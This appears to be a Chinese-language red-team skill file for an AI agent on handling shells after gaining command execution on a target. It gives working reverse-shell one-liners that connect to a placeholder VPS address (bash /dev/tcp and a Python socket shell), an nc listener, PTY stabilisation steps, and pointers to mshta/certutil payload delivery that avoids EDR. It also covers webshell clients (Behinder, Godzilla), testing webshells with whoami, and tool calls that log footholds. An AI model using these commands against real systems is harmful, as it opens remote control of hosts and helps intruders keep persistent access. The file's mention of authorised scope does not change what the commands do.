---
name: shell-handler
description: Shell 会话管理：反弹/正连/WebShell 的连接、稳定化与保持
tags: exploit, shell
---

# Shell 会话管理

> 拿到命令执行后，**先稳定化**再干活。裸 shell 断一次就白干。

## 稳定化（Linux）

```bash
# 有 python 时
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 然后 Ctrl+Z，本地执行
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
```

没有 python 就退而求其次：

```bash
script -qc /bin/bash /dev/null
```

## 反弹 Shell（授权范围内）

```bash
# 攻击者监听
nc -lvnp 4444

# 目标侧（各语言备选，按可用性挑）
bash -i >& /dev/tcp/<VPS_IP>/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<VPS_IP>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
```

Windows 侧优先 PowerShell 编码命令，或 `mshta`/`certutil` 落地（注意 EDR）。

## WebShell 连接

| 类型 | 客户端 | 注意 |
|---|---|---|
| 冰蝎 | Behinder | 密钥必须与生成时一致 |
| 哥斯拉 | Godzilla | 记录 payload 类型 + 密钥 |
| 一句话 | 手工 curl | 易被 WAF 拦 |

**连上必须实测**：`curl` 让马执行 `whoami`，看到输出才算。

## 落库

```
redteam_webshell_add({ assetId, url, type })
redteam_access_add({ host, method: 'web-shell', username, privilege })
```

## 判定标准

- [ ] 能执行命令并看到回显（不是"上传成功"）
- [ ] Linux 已做 pty 稳定化
- [ ] 入口已登记（url + type + 关联资产）

## 常见坑

| 坑 | 处理 |
|---|---|
| 裸 shell 一断就没了 | 先 pty 稳定化，或改用隧道 |
| 密钥丢了 | 生成时立刻记进 `redteam_credential_add`（脱敏） |
| 一次开一堆 session | 一个入口先用通，再扩 |
| 在共享终端里贴 payload | 会被别人看到，也会进历史 |
